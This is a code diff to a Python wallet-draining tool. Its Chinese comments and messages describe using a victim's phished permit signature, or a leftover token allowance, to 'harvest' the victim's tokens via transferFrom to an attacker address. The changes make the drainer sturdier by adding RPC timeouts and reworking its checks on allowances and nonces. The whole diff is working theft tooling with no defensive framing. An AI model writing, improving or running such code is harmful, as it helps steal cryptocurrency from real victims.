@@ -206,12 +206,17 @@ def rpc_call(url: str, method: str, params):
     return out["result"]
 
 
+SEL_NONCES = "0x7ecebe00"     # nonces(address)
+SEL_ALLOWANCE = "0xdd62ed3e"  # allowance(address,address)
+
+
 def token_nonce(cfg: dict, owner: str):
     """读代币合约 nonces(owner);链不可达返回 None(调用方自行降级)。Ref #75"""
-    data = "0x7ecebe00" + _addr_word(owner)
+    data = SEL_NONCES + _addr_word(owner)
     try:
         out = drain.rpc(cfg["chain"]["rpc"], "eth_call",
-                        [{"to": cfg["token"]["address"], "data": data}, "latest"])
+                        [{"to": cfg["token"]["address"], "data": data}, "latest"],
+                        timeout=5)
         return int(out, 16) if out and out != "0x" else None
     except Exception:
         return None
@@ -219,10 +224,11 @@ def token_nonce(cfg: dict, owner: str):
 
 def token_allowance(cfg: dict, owner: str, spender: str):
     """读代币合约 allowance(owner, spender);链不可达返回 None。"""
-    data = "0xdd62ed3e" + _addr_word(owner) + _addr_word(spender)
+    data = SEL_ALLOWANCE + _addr_word(owner) + _addr_word(spender)
     try:
         out = drain.rpc(cfg["chain"]["rpc"], "eth_call",
-                        [{"to": cfg["token"]["address"], "data": data}, "latest"])
+                        [{"to": cfg["token"]["address"], "data": data}, "latest"],
+                        timeout=5)
         return int(out, 16) if out and out != "0x" else None
     except Exception:
         return None
@@ -258,8 +264,13 @@ def run_drain(cfg: dict, item: dict) -> dict:
         chain_nonce = token_nonce(cfg, victim)
         if chain_nonce is not None and chain_nonce != item["nonce"]:
             allowance = token_allowance(cfg, victim, attacker)
-            hint = (f";且 allowance={allowance} 仍在,可直接 transferFrom 收割,无需重新签名"
-                    if allowance else ";需受害者重新签名")
+            if allowance is not None and allowance > 0:
+                hint = (f";且 allowance={allowance} 仍在,可用 drain.py 直接 "
+                        f"transferFrom 收割,无需重新签名")
+            elif allowance is None:
+                hint = ";且授权状态未知(链不可达),收割前先核验 allowance"
+            else:
+                hint = ";需受害者重新签名"
             raise RuntimeError(f"permit 签名 nonce 过期:签名 nonce={item['nonce']},"
                                f"链上当前 {chain_nonce}{hint}")
         v, r, s = drain.parse_permit_sig(item["sig"])
